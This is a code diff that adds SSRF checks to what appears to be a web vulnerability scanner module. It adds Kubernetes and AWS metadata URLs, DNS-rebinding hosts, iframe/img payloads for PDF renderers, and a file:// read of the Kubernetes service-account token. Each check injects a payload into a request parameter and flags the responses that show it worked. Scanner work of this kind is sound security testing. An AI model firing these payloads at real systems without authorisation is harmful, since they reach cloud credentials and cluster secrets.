@@ -39,6 +39,13 @@ class SSRFModule:
             'alibaba': [
                 'http://100.100.100.200/latest/meta-data/',
             ],
+            'aws_imdsv2': [
+                'http://169.254.169.254/latest/api/token',
+            ],
+            'kubernetes': [
+                'https://kubernetes.default.svc/api/v1/namespaces/default/pods',
+                'https://kubernetes.default.svc/api/v1/secrets',
+            ],
         }
         
         # SSRF response indicators (more specific to avoid false positives)
@@ -76,7 +83,104 @@ class SSRFModule:
         
         # Test protocol wrappers
         self._test_protocols(url, method, param, value)
+        
+        # Test DNS rebinding
+        self._test_dns_rebinding(url, method, param, value)
+        
+        # Test PDF generation SSRF
+        self._test_pdf_ssrf(url, method, param, value)
+        
+        # Test Kubernetes metadata
+        self._test_kubernetes_metadata(url, method, param, value)
     
+    def _test_dns_rebinding(self, url: str, method: str, param: str, value: str):
+        """Test for DNS rebinding SSRF"""
+        payloads = [
+            'http://7f000001.c0a80001.rbndr.us/',
+            'http://0x7f000001/',
+            'http://[::1]/',
+            'http://127.1/',
+            'http://127.0.0.1.nip.io/',
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                text = response.text.lower()
+                for indicator_list in self.ssrf_indicators.values():
+                    for indicator in indicator_list:
+                        if indicator.lower() in text:
+                            from core.engine import Finding
+                            finding = Finding(
+                                technique="SSRF (DNS Rebinding)", url=url,
+                                severity='HIGH', confidence=0.8, param=param,
+                                payload=payload,
+                                evidence=f"DNS rebinding indicator: {indicator}",
+                            )
+                            self.engine.add_finding(finding)
+                            return
+            except Exception:
+                continue
+
+    def _test_pdf_ssrf(self, url: str, method: str, param: str, value: str):
+        """Test for SSRF via PDF generation"""
+        payloads = [
+            '<iframe src="http://169.254.169.254/latest/meta-data/">',
+            '<img src="http://169.254.169.254/latest/meta-data/">',
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                text = response.text.lower()
+                for indicator_list in self.ssrf_indicators.values():
+                    for indicator in indicator_list:
+                        if indicator.lower() in text:
+                            from core.engine import Finding
+                            finding = Finding(
+                                technique="SSRF (PDF Generation)", url=url,
+                                severity='HIGH', confidence=0.8, param=param,
+                                payload=payload,
+                                evidence=f"PDF SSRF indicator: {indicator}",
+                            )
+                            self.engine.add_finding(finding)
+                            return
+            except Exception:
+                continue
+
+    def _test_kubernetes_metadata(self, url: str, method: str, param: str, value: str):
+        """Test for Kubernetes metadata SSRF"""
+        k8s_payloads = [
+            'https://kubernetes.default.svc/api/v1/namespaces/default/pods',
+            'https://kubernetes.default.svc/api/v1/secrets',
+            'file:///var/run/secrets/kubernetes.io/serviceaccount/token',
+        ]
+        k8s_indicators = ['apiversion', 'kind', 'metadata', 'serviceaccount', 'kubernetes']
+        for payload in k8s_payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                text = response.text.lower()
+                for indicator in k8s_indicators:
+                    if indicator in text:
+                        from core.engine import Finding
+                        finding = Finding(
+                            technique="SSRF (Kubernetes Metadata)", url=url,
+                            severity='CRITICAL', confidence=0.9, param=param,
+                            payload=payload,
+                            evidence=f"K8s indicator: {indicator}",
+                        )
+                        self.engine.add_finding(finding)
+                        return
+            except Exception:
+                continue
+
     def test_url(self, url: str):
         """Test URL for SSRF"""
         pass
